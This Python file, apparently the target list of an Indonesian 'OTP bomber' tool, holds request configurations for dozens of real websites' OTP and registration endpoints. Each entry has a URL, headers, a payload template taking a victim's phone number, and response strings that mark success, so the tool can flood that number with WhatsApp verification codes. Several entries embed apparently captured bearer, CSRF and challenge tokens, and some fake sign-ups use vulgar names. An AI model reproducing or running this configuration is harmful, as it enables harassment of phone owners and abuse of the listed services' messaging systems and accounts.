#!/usr/bin/env python3
# targets.py - Daftar target OTP WhatsApp

import uuid
import random

from utils import fmt_08, fmt_nocode, fmt_plus, fmt_phone_only

TARGETS = [
    {
        'name': 'HRS-BRE',
        'post_type': 'hrsbre',
        'number_fmt': fmt_08,
        'success_on': ['success', 'berhasil', 'otp', 'verifikasi', 'selamat']
    },
    {
        'name': 'EraFone',
        'post_type': 'erafone',
        'number_fmt': lambda p: p,
        'success_on': ['Success Request OTP']
    },
    {
        'name': 'PlanetBan',
        'post_type': 'planetban',
        'number_fmt': fmt_08,
        'success_on': ['status":true', 'success']
    },
    {
        'name': 'TuneUp',
        'post_type': 'tuneup',
        'number_fmt': fmt_08,
        'success_on': ['"success":true']
    },
    {
        'name': 'HashMicro',
        'post_type': 'hashmicro',
        'number_fmt': fmt_phone_only,
        'success_on': ['success', 'thank', 'terimakasih', 'redirect']
    },
    {
        'name': 'Klook',
        'post_type': 'klook',
        'number_fmt': fmt_plus,
        'success_on': ['requestId']
    },
    {
        'name': 'Internet Rakyat',
        'post_type': 'internetrakyat',
        'number_fmt': fmt_08,
        'success_on': ['"statusCode":200']
    },
    {
        'name': 'Ultramilk',
        'post_type': 'ultramilk',
        'number_fmt': lambda p: p,
        'success_on': ['success']
    },
    {
        'name': 'Kaniva',
        'post_type': 'kaniva',
        'number_fmt': fmt_08,
        'success_on': ['"message":"success"']
    },
    {
        'name': 'Jembatani',
        'post_type': 'jembatani',
        'number_fmt': fmt_08,
        'success_on': ['"success":true']
    },
    {
        'name': 'RCX',
        'post_type': 'rcx',
        'number_fmt': fmt_08,
        'success_on': ['challenge', 'redirecting']
    },
    {
        'name': 'Sahabat Teknisi',
        'post_type': 'sahabatteknisi',
        'number_fmt': fmt_08,
        'success_on': ['success']
    },
    {
        'name': 'Auto2000',
        'post_type': 'auto2000',
        'number_fmt': fmt_08,
        'success_on': ['"acknowledge":1']
    },
    {
        'name': 'Astra Daihatsu',
        'post_type': 'astra_daihatsu',
        'number_fmt': fmt_plus,
        'success_on': ['OTP Success']
    },
    {
        'name': 'Royal Canin',
        'post_type': 'royal_canin',
        'number_fmt': fmt_plus,
        'success_on': ['SUCCESS']
    },
    {
        'name': 'Watsons',
        'post_type': 'watsons',
        'number_fmt': fmt_phone_only,
        'success_on': ['token']
    },
    {
        'name': '99.co',
        'post_type': '99co',
        'number_fmt': fmt_plus,
        'success_on': ['ok']
    },
    {
        'name': 'Beli Rumah',
        'post_type': 'belirumahco',
        'number_fmt': fmt_plus,
        'success_on': ['success', 'otp', 'code']
    },
    {
        'name': 'Fastwork',
        'post_type': 'fastworkid',
        'number_fmt': fmt_08,
        'success_on': ['reference_code']
    },
    {
        'name': 'Beautyhaul',
        'post_type': 'beautyhaul',
        'number_fmt': fmt_phone_only,
        'success_on': []
    },
    {
        'name': 'Hainaya',
        'post_type': 'hainaya',
        'number_fmt': fmt_phone_only,
        'success_on': ['otp', 'success', 'tenant_id', 'session_id']
    },
    {
        'name': 'MinumYukKaka',
        'post_type': 'minumyukkaka',
        'number_fmt': fmt_08,
        'success_on': ['IsSuccess', 'success', 'otp']
    },
    {
        'name': 'SIDEMANG',
        'post_type': 'sidemang',
        'number_fmt': fmt_08,
        'success_on': ['otpDispatched']
    },
    {
        'name': 'LaporMasBup',
        'post_type': 'lapormasbup',
        'number_fmt': fmt_08,
        'success_on': ['berhasil', 'warga_id', 'message']
    },
    {
        'name': 'PTSP Kemenag',
        'post_type': 'ptspkemenag',
        'number_fmt': fmt_08,
        'success_on': ['success', 'user']
    },
    # JSON Handlers
    {
        'name': 'Pinhome',
        'post_type': 'json',
        'url': 'https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp',
        'referer': 'https://www.pinhome.id/daftar',
        'headers': {
            'Content-Type': 'application/json',
            'Origin': 'https://www.pinhome.id'
        },
        'payload': '{"accountType":"customers","applicationType":"Pinhome Web","countryCode":"62","otpType":"register","phoneNumber":"{number}"}',
        'number_fmt': fmt_nocode,
        'success_on': ['success', 'true']
    },
    {
        'name': 'Maulagi',
        'post_type': 'json',
        'url': 'https://api.maulagi.id/api/v2/auth/check',
        'referer': 'https://maulagi.id/daftar/verifikasi',
        'headers': {
            'Content-Type': 'application/json',
            'Accept': 'application/json, text/plain, */*',
            'X-ML-KEY': 'E22UZKWA22',
            'Origin': 'https://maulagi.id'
        },
        'payload': '{"credentials":"{number}"}',
        'number_fmt': fmt_08,
        'success_on': ['success', 'true', 'data']
    },
    {
        'name': 'Rumah123',
        'post_type': 'json',
        'url': 'https://www.rumah123.com/auth/check-phonenumber',
        'referer': 'https://www.rumah123.com/user/login/?redirect=https://www.rumah123.com/',
        'headers': {
            'Content-Type': 'application/json;charset=UTF-8',
            'Origin': 'https://www.rumah123.com',
            'Base-Url-Core': 'https://www.rumah123.com'
        },
        'payload': '{"phone_number":"{number}"}',
        'number_fmt': fmt_plus,
        'success_on': ['success', 'true', 'data']
    },
    {
        'name': 'Paper',
        'post_type': 'json',
        'url': 'https://register.paper.id/api/v1/auth/register/send-otp',
        'referer': 'https://paper.id/',
        'headers': {'Content-Type':'application/json','Origin':'https://paper.id','x-paper-user-agent':'multiverse/2.54.1 mobile_web (android) chrome'},
        'payload': '{"phone":"{number}","method":"whatsapp","registered_by":"flutter mweb"}',
        'number_fmt': lambda p: p,
        'success_on': ['otp']
    },
    {
        'name': 'Dunia Games',
        'post_type': 'json',
        'url': 'https://api.duniagames.co.id/api/user/api/v2/user/send-otp',
        'referer': 'https://duniagames.co.id/',
        'headers': {'Content-Type':'application/json','Origin':'https://duniagames.co.id','x-device':'85d3da46-4d56-4675-90fc-e27926c56de1'},
        'payload': '{"phoneNumber":"{number}","userName":"{raw}"}',
        'number_fmt': fmt_plus,
        'success_on': ['otp']
    },
    {
        'name': 'MAPCLUB',
        'post_type': 'form',
        'url': 'https://fhapi.mapclub.com/v1/member/signup1',
        'referer': 'https://foodhall.mapclub.com/member1/register',
        'headers': {
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept': 'application/json',
            'Authorization': 'Bearer 221f3aa8d05758144b44bc1a5834d862c8db22575c79044f292acc46922e83071788524034',
            'Timestamp': '1788524034'
        },
        'payload': (
            'firstName=Anak&'
            'lastName=Kontol&'
            'phone={number}&'
            'email=test@gmail.com&'
            'birthDate=1994-09-04&'
            'city=Kota+Samarinda&'
            'referralCode=&'
            'biz=37&'
            'gender=MALE'
        ),
        'number_fmt': lambda p: p,
    },
    {
        'name': 'Bonus Belanja',
        'post_type': 'json',
        'url': 'https://www.bonusbelanja.com/api/auth/registration/app',
        'referer': 'https://www.bonusbelanja.com/register/',
        'headers': {
            'Content-Type': 'application/json',
            'Origin': 'https://www.bonusbelanja.com'
        },
        'payload': '{"phone":"{number}","name":"User","agreeTnc":true,"agreeContact":true}',
        'number_fmt': lambda p: p,
        'success_on': ['error":false']
    },
    {
        'name': 'Matahari',
        'post_type': 'json',
        'url': 'https://matahari-backend-prod.matahari.com/api/auth/register',
        'referer': 'https://matahari.com/',
        'headers': {'Content-Type':'application/json','Origin':'https://matahari.com'},
        'payload': '{"emailAddress":"{email}","name":"{name}","mobileCountryCode":"","mobileNumber":"{number}","birthDate":"2000-01-01","genderId":"1","password":"{pw}","cardNumber":"","referralCode":"","salesmanId":"","pickupStoreCode":"","marketingCode":""}',
        'number_fmt': fmt_08,
        'success_on': ['otp','success','code','already exists']
    },
    {
        'name': 'Tokopedia OTP',
        'post_type': 'json',
        'url': 'https://gql.tokopedia.com/graphql/OTPRequest',
        'referer': 'https://www.tokopedia.com/register',
        'headers': {
            'Content-Type': 'application/json',
            'Accept': '*/*',
            'Origin': 'https://www.tokopedia.com',
            'x-tkpd-lite-service': 'oauth',
            'x-version': '04f884c',
            'x-tkpd-akamai': 'otp',
            'x-source': 'tokopedia-lite',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Mobile Safari/537.36'
        },
        'payload': '[{"operationName":"OTPRequest","variables":{"msisdn":"{number}","MsisdnEnc":"","EmailEnc":"","otpType":"116","mode":"whatsapp","otpDigit":6},"query":"query OTPRequest($otpType: String!, $mode: String, $msisdn: String, $email: String, $otpDigit: Int, $ValidateToken: String, $UserIDEnc: String, $UserIDSigned: String, $Signature: String, $MsisdnEnc: String, $EmailEnc: String, $source: String) {\\n  OTPRequest: OTPRequestV2(otpType: $otpType, mode: $mode, msisdn: $msisdn, email: $email, otpDigit: $otpDigit, ValidateToken: $ValidateToken, UserIDEnc: $UserIDEnc, UserIDSigned: $UserIDSigned, Signature: $Signature, MsisdnEnc: $MsisdnEnc, EmailEnc: $EmailEnc, source: $source) {\\n    success\\n    message\\n    errorMessage\\n    sse_session_id\\n    list_device_receiver\\n    error_code\\n    message_title\\n    message_sub_title\\n    message_img_link\\n    __typename\\n  }\\n}\\n"}]',
        'number_fmt': fmt_08,
        'success_on': ['success', 'true']
    },
    {
        'name': 'Tiket.com OTP',
        'post_type': 'json',
        'url': 'https://account.bliblitiket.com/gateway/gks-unm-go-be/api/v1/otp/generate',
        'referer': 'https://account.bliblitiket.com/login/complete-details',
        'headers': {
            'Content-Type': 'application/json',
            'Accept': 'application/json, text/plain, */*',
            'Origin': 'https://account.bliblitiket.com',
            'X-Request-Id': '1677fe9b-7e5a-4590-9972-8a28e6df133d',
            'X-Channel-Id': 'MWEB',
            'X-Client-Id': '9dc79e3916a042abc86c2aa525bff009',
            'X-Entity': 'TIKET',
            'X-Lang': 'id',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Mobile Safari/537.36'
        },
        'payload': '{"action":"REGISTER_OTP","channel":"WHATS_APP","recipient":"+{number}","recaptchaToken":"","challengeToken":"1.xr84hxAEU0G9_8_E5hXXm2QHbyNRdhGqekEtLnAraEsuotOoki0XX5Qa-AKCxarUU1E0d7tzzTc16OiG3ao60Al7R3wjYyMPsfA7gMIfcUkl-g7goWQr6BankswCIqrOvxc3xaxAqfUg2bP_8dA0D8W1uKRIbH_HfNcMQbEGH8ep21FH_x4wBqeU8QzK8CN8HngkAUYrJnRMiMg2k-HWty12OTzkYtKHsc9njCXRyyZo5EjSHyGO25zX24yTDyjqhjrx5SDsJ1qBBKc7W5IWRSo7PFqW2Iwd8lJIocLp_etAi3tG617bDw1maUKrpSQCEUdrxDvmrG8p8QWZILLHqGpiSyiUeK8dQyb4BNdyoUZK0t_G86tW5X6-rR4CMDvT7fV5sCVsI0QquGu7cum-h87v-9USp4WZRIv9NgPkhfj8LrA2aqp85i5l2kbKna0E0k_oymARLFyf_L9dNoj6EIud7R1U35HcoaxnZyYWhMpVGAednBDSbaxFj7NUT9sUp86eDmcHnGw_QQGjYUMuukjJCscPo8ll6QLtkCjOPD5NroV_wSMFUYikhyDI2Kr6S6n9rxP_3ksgGeBpfT6XM9_WHVaM_Egbf4ompZv4obIWhrpt1KsycujDZd-7-NwP9es0cJVqLN_19J2flVEypLTvMDmCaCbABVTiqwJcqXM.wtR2WosJp6Azh366pTKgxw.a6714586836dc6c56d207211d67c82e284a6d58a50a15e9df3106bf8a8675934"}',
        'number_fmt': fmt_08,
        'success_on': ['success', 'true', 'data']
    },
    {
        'name': 'Catato ID',
        'post_type': 'json',
        'url': 'https://catato.id/api/v1/auth/register/start',
        'referer': 'https://catato.id/register',
        'headers': {
            'Accept': 'application/json',
            'Content-Type': 'application/json',
            'Origin': 'https://catato.id',
            'X-Request-ID': 'web-a86d2f94-6382-46e0-a0bd-e946794b4e01',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Mobile Safari/537.36'
        },
        'payload': '{"name":"Kontol","email":"test@gmail.com","phone":"+{number}","password":"Jepin28282811.","password_confirmation":"Jepin28282811.","plan_id":"01ky6hrxbmjmhznyvfj41hbnd3","referral_source":"code"}',
        'number_fmt': fmt_08,
        'success_on': ['success', 'true', 'data']
    },
    {
        'name': 'ACC OTP',
        'post_type': 'json',
        'url': 'https://www.acc.co.id/register/new-account/pin',
        'referer': 'https://www.acc.co.id/register/new-account/pin',
        'headers': {
            'Content-Type': 'application/json',
            'Accept': 'text/x-component',
            'Origin': 'https://www.acc.co.id',
            'next-action': '7f8e862fff4b3a97ae5e866780a086283a999e8a7f',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Mobile Safari/537.36'
        },
        'payload': '[{"user_id":null,"action":"register","send_to":"{number}","provider":"whatsapp"}]',
        'number_fmt': fmt_08,
        'success_on': ['success', 'true', 'data']
    },
    {
        'name': 'Brighty Official',
        'post_type': 'data',
        'url': 'https://membership.brightyofficial.com/send_otp',
        'referer': 'https://membership.brightyofficial.com/register',
        'headers': {
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Origin': 'https://membership.brightyofficial.com',
            'X-CSRF-TOKEN': 'EzG6fxnas6x0ZigJf316JDg6c9oPhm2fHLXmgYzq',
            'X-Requested-With': 'XMLHttpRequest',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Mobile Safari/537.36'
        },
        'payload': 'phone_number={number}',
        'number_fmt': fmt_08,
        'success_on': ['success', 'true']
    },
    {
        'name': 'KapanLagi',
        'post_type': 'json',
        'url': 'https://www.kapanlagi.com/api/v2/auth/otp/request',
        'referer': 'https://www.kapanlagi.com/',
        'headers': {
            'Content-Type': 'application/json',
            'Accept': 'application/json, text/plain, */*',
            'Origin': 'https://www.kapanlagi.com',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Mobile Safari/537.36'
        },
        'payload': '{"phone":"{number}","channel":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['success', 'true']
    },
    {
        'name': 'Vidio',
        'post_type': 'json',
        'url': 'https://www.vidio.com/api/v1/users/send_otp',
        'referer': 'https://www.vidio.com/',
        'headers': {
            'Content-Type': 'application/json',
            'Accept': 'application/json',
            'Origin': 'https://www.vidio.com',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Mobile Safari/537.36'
        },
        'payload': '{"phone_number":"{number}","method":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['success', 'true']
    },
    {
        'name': 'Sociolla',
        'post_type': 'json',
        'url': 'https://www.sociolla.com/api/v1/auth/send-otp',
        'referer': 'https://www.sociolla.com/register',
        'headers': {
            'Content-Type': 'application/json',
            'Accept': 'application/json',
            'Origin': 'https://www.sociolla.com',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Mobile Safari/537.36'
        },
        'payload': '{"phone":"{number}","type":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['success', 'true']
    },
    {
        'name': 'Cermati',
        'post_type': 'json',
        'url': 'https://www.cermati.com/api/v1/auth/otp/send',
        'referer': 'https://www.cermati.com/gabung',
        'headers': {
            'Content-Type': 'application/json',
            'Accept': 'application/json',
            'Origin': 'https://www.cermati.com',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Mobile Safari/537.36'
        },
        'payload': '{"mobilePhone":"{number}","channel":"WHATSAPP"}',
        'number_fmt': fmt_08,
        'success_on': ['success', 'true']
    },
    {
        'name': 'Sayurbox',
        'post_type': 'json',
        'url': 'https://www.sayurbox.com/api/v3/auth/request-otp',
        'referer': 'https://www.sayurbox.com/login',
        'headers': {
            'Content-Type': 'application/json',
            'Accept': 'application/json',
            'Origin': 'https://www.sayurbox.com',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Mobile Safari/537.36'
        },
        'payload': '{"phone":"{number}","type":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['success', 'true']
    },
    {
        'name': 'Ralali',
        'post_type': 'json',
        'url': 'https://www.ralali.com/api/customer/v1/auth/request-otp',
        'referer': 'https://www.ralali.com/register',
        'headers': {
            'Content-Type': 'application/json',
            'Accept': 'application/json',
            'Origin': 'https://www.ralali.com',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Mobile Safari/537.36'
        },
        'payload': '{"phone_number":"{number}","method":"whatsapp"}',
        'number_fmt': fmt_08,
        'success_on': ['success', 'true']
    }
]
